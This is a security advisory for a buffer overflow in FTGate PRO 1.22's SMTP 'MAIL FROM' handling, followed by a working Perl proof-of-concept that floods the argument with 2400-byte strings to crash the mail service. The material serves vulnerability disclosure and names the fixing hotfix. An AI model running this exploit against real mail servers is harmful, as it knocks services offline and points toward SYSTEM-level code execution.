source: http://www.securityfocus.com/bid/7506/info

A buffer overflow vulnerability has been reported for Floosietek FTGate PRO mail server. The vulnerability exists when the mail server attempts to process overly long SMTP 'Mail From' arguments. Due to the nature of this vulnerability it may be exploited to execute attacker-supplied code with the privileges of the SYSTEM user.

This vulnerability was reported for FTGate PRO 1.22 Hotfix(1328). It is likely that previous versions are also affected. 

#!/usr/bin/perl -w
##################
# FTGate Pro Mail Server v. 1.22 (1328) DoS attack
#
# URL: http://www.infowarfare.dk/
# EMAIL: der@infowarfare.dk
# USAGE: sploit.pl <target ip>
#
# Summary:
#
# The problem is a Buffer Overflow in the SMTP protocol, within the 
# ESMTP Server FTGate, causing the service to stop responding for a short
# Period, where we can actually overwrite the exception handler on the stack allowing 
# A system compromise with code execution running as SYSTEM.
# 
#
# Solution: 
# Upgrade to FTGate Pro Mail Server v. 1.22 (HotFix 1330) or later
# 
#

use IO::Socket;
    
$target = shift() || "warlab.dk";
my $port = 25;
my $Buffer = "a" x 2400;


my $sock = IO::Socket::INET->new (
                                    PeerAddr => $target,
                                    PeerPort => $port,
                                    Proto => 'tcp'
                                 ) || die "could not connect: $!";

my $banner = <$sock>;
if ($banner !~ /^2.*/)
{
    print STDERR "Error: invalid server response '$banner'.\n";
    exit(1);
}

print $sock "HELO $target\r\n";
$resp = <$sock>;

print $sock "MAIL FROM: $Buffer\@$Buffer.dk\r\n";
$resp = <$sock>;

print $sock "\r\n";
print $sock "\r\n\r\n\r\n\r\n\r\n\r\n";

close($sock);